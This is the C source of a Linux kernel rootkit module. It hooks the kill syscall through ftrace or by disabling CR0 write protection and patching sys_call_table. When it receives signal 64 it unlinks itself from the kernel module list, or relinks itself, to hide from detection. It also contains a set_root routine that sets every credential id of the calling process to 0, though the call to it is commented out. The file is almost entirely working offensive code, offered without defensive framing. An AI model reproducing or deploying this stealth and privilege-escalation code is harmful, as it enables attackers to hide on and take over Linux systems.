#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("clf");
MODULE_DESCRIPTION("hide module");
MODULE_VERSION("0.01");

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
// #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
// #define PTREGS_SYSCALL_STUBS 1
// #endif

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
// #ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage int (*init_kill)(pid_t pid, int sig);
static int hidden = 0;

static struct list_head *prev_module;

void hideme(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    // THIS_MODULE->list.prev->next = THIS_MODULE->list.next;
    // THIS_MODULE->list.next->prev = THIS_MODULE->list.prev;
    // list_del_init(&THIS_MODULE->list);
}

void showme(void) {
    //static inline void list_add(struct list_head *new, struct list_head *head)
    list_add_tail(&THIS_MODULE->list, prev_module);
    //list_add(&THIS_MODULE->list, prev_module);
    // THIS_MODULE->list.prev->next = &THIS_MODULE->list;
    
//     THIS_MODULE->list.next->prev = &THIS_MODULE->list;
}



/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused) 
 * and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        //set_root();
        printk(KERN_INFO "rootkit: giving root...\n");
        if (hidden == 0) {
            printk(KERN_INFO "rootkit: hideme...\n");
            hideme();
            hidden = 1;
            return 0;
        } else {
            printk(KERN_INFO "rootkit: showme...\n");
            showme();
            hidden = 0;
            return 0;
        }
        
    }

    return orig_kill(regs);
}

asmlinkage int my_kill(pid_t pid, int sig) {
    void set_root(void);
    // void hideme(void);
    // void showme(void);

    if ( sig == 64 )
    {
        //set_root();
        printk(KERN_INFO "rootkit: giving root...\n");
        if (hidden == 0) {
            printk(KERN_INFO "rootkit: hideme...\n");
            hideme();
            hidden = 1;
            return 0;
        } else {
            printk(KERN_INFO "rootkit: showme...\n");
            showme();
            hidden = 0;
            return 0;
        }
    }

    return init_kill(pid, sig);
}

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

unsigned long * sys_call_table = 0;
static long orig_cr0 = 0;

void mywrite_cr0(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : "+r"(cr0));
}

void disable_write_protection(void) {
    orig_cr0 = read_cr0();
    mywrite_cr0(orig_cr0 & (~0x10000)); //set wp to 0
}

void enable_write_protection(void) {
    mywrite_cr0(orig_cr0);          //set wp to 1
}
/* Module initialization function */
static int __init rootkit_init(void)
{
#ifdef sys_table
    /* Hook the syscall and print to the kernel buffer */
    disable_write_protection();
    //get sys_call_table
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    //save the pointer to clone
    init_kill = (sys_call_table[__NR_kill]);
    //substitute sys_call_table with my_syscall
    sys_call_table[__NR_kill] = (unsigned long) hook_kill;
    enable_write_protection();
#else 
    
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;
#endif

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
#ifdef sys_table
    disable_write_protection();
    //restore sys_call_table
    sys_call_table[__NR_kill] = init_kill;
    enable_write_protection();
#else 
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
#endif
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);